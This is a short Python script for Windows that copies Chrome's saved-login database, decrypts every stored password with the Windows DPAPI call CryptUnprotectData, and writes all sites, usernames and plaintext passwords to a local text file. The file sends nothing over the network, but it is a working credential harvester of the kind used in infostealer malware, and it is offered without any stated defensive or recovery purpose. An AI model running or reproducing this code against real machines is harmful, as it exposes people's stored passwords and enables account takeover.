import os
import sys
import shutil
import sqlite3
import win32crypt


dir_path = os.path.dirname(os.path.realpath(__file__))
db_file_path = os.path.join(os.environ["LOCALAPPDATA"], r"Google\Chrome\User Data\Default\Login Data")

outFile_path = os.path.join(dir_path, "ChromePass.txt")
if os.path.exists(outFile_path):
    os.remove(outFile_path)

tmp_file = os.path.join(dir_path, "tmp_tmp_tmp")
if os.path.exists(tmp_file):
    os.remove(tmp_file)

shutil.copyfile(db_file_path, tmp_file)    # In case file locked
conn = sqlite3.connect(tmp_file)
for row in conn.execute("select signon_realm, username_value, password_value from logins"):
    try:
        _web_site = row[0]
        _user = row[1]
        _tmp_pwd = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
        _pwd = _tmp_pwd.decode("utf-8")
    except Exception as ex:
        print("Fail to decrypt chrome passwords")
        sys.exit(-1)
    with open(outFile_path, "a+", encoding="utf-8") as outFile:
        outFile.write("Site:{0:<40} User:{1:<24} Pwd:{2} \r".format(_web_site, _user, _pwd))
conn.close()
print("All Chrome passwords saved to:\n" + outFile_path)
os.remove(tmp_file)    # Remove temp file
